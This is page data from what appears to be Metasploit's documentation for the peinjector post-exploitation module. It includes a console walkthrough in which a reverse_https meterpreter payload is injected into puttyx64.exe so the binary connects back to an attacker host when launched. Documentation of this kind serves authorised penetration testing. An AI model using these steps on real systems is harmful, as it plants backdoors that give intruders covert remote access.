{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/windows/manage/peinjector","result":{"data":{"moduleMetadataJson":{"id":"03507683-2161-52e8-b985-6e61517b428d","name":"Peinjector","fullname":"post/windows/manage/peinjector","description":"This module will inject a specified windows payload into a target executable.","rank":300,"fields":{"detailsSlug":"/modules/details/post/windows/manage/peinjector","documentationSlug":"/modules/documentation/post/windows/manage/peinjector","referencesSlug":"/modules/references/post/windows/manage/peinjector"},"documentation":{"html":"<h2 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h2>\n<p>This module inserts a payload into an existing PE file on a remote\nmachine.  When a user launches the binary, the payload will run\nas a thread within the process with the same privs.</p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>LHOST  IP of host that will receive the connection from the payload.\nLPORT  Port for Payload to connect to.\nOPTIONS Comma separated list of additional options for payload if needed in 'opt=val,opt=val' format.\nPAYLOAD Windows Payload to inject into the targer executable.\nSESSION The session to run this module on.\nTARGETPE Path of the target executable to Path of the target executable to be injected</p>\n<h2 id=\"limitations\" style=\"position:relative;\"><a href=\"#limitations\" aria-label=\"limitations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Limitations</h2>\n<p>This process is not reverse-able.  If you would like to return the\nbinary to it's original state, save a copy.</p>\n<p>THE PAYLOAD WILL NOT SPAWN AN INDEPENDENT PROCESS/THREAD AND THE SESSION\nWILL DIE WITH THE BINARY AND/OR WILL KILL THE BINARY WHEN THE SESSION\nEXITS.  Be careful closing sessions that were spawned using this method!</p>\n<p>If a setting is wrong, it may cause the binary to fail to launch,\nalerting the user to possible shinnanigans.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p><code class=\"language-text\">Vulnerable</code> is a bad term; this module inserts shellcode into a pe\nfile.  That means any Windows pe files are <code class=\"language-text\">vulnerable</code>.\nBe aware that some files like calc.exe on later Windows versions\nare not entirely normal in their behvior and are not <code class=\"language-text\">vulnerable</code></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ul>\n<li>get session on target</li>\n<li><code class=\"language-text\">use post/windows/manage/peinjector</code></li>\n<li><code class=\"language-text\">set payload &lt;payload&gt;</code></li>\n<li><code class=\"language-text\">set lport &lt;lport&gt;</code></li>\n<li><code class=\"language-text\">set lhost &lt;lhost&gt;</code></li>\n<li><code class=\"language-text\">set targetpe &lt;*.exe&gt;</code></li>\n<li><code class=\"language-text\">run</code></li>\n</ul>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; sysinfo\nComputer        : WIN10X64-1511\nOS              : Windows 10 (Build 10586).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x64/windows\nmeterpreter &gt; background\n[*] Backgrounding session 1...\nmsf5 exploit(multi/handler) &gt; use post/windows/manage/peinjector \nmsf5 post(windows/manage/peinjector) &gt; show options\n\nModule options (post/windows/manage/peinjector):\n\n   Name      Current Setting                    Required  Description\n   ----      ---------------                    --------  -----------\n   LHOST                                        yes       IP of host that will receive the connection from the payload.\n   LPORT     4433                               no        Port for Payload to connect to.\n   OPTIONS                                      no        Comma separated list of additional options for payload if needed in &#39;opt=val,opt=val&#39; format.\n   PAYLOAD   windows/meterpreter/reverse_https  no        Windows Payload to inject into the targer executable.\n   SESSION                                      yes       The session to run this module on.\n   TARGETPE                                     no        Path of the target executable to be injected\n\nmsf5 post(windows/manage/peinjector) &gt; set lhost 192.168.135.111\nlhost =&gt; 192.168.135.111\nmsf5 post(windows/manage/peinjector) &gt; set lport 4561\nlport =&gt; 4561\nmsf5 post(windows/manage/peinjector) &gt; set payload windows/x64/meterpreter/reverse_https\npayload =&gt; windows/x64/meterpreter/reverse_https\nmsf5 post(windows/manage/peinjector) &gt; set session 1\nsession =&gt; 1\nmsf5 post(windows/manage/peinjector) &gt; set targetpe &#39;C:\\users\\msfuser\\downloads\\puttyx64.exe&#39;\ntargetpe =&gt; C:\\users\\msfuser\\downloads\\puttyx64.exe\nmsf5 post(windows/manage/peinjector) &gt; show options\n\nModule options (post/windows/manage/peinjector):\n\n   Name      Current Setting                          Required  Description\n   ----      ---------------                          --------  -----------\n   LHOST     192.168.135.111                          yes       IP of host that will receive the connection from the payload.\n   LPORT     4561                                     no        Port for Payload to connect to.\n   OPTIONS                                            no        Comma separated list of additional options for payload if needed in &#39;opt=val,opt=val&#39; format.\n   PAYLOAD   windows/x64/meterpreter/reverse_https    no        Windows Payload to inject into the targer executable.\n   SESSION   1                                        yes       The session to run this module on.\n   TARGETPE  C:\\users\\msfuser\\downloads\\puttyx64.exe  no        Path of the target executable to be injected\n\nmsf5 post(windows/manage/peinjector) &gt; run\n\n[*] Running module against WIN10X64-1511\n[*] Generating payload\n[*] Injecting Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet) into the executable C:\\users\\msfuser\\downloads\\puttyx64.exe\n[+] Successfully injected payload into the executable: C:\\users\\msfuser\\downloads\\puttyx64.exe\n[*] Post module execution completed\nmsf5 post(windows/manage/peinjector) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"03507683-2161-52e8-b985-6e61517b428d"}}}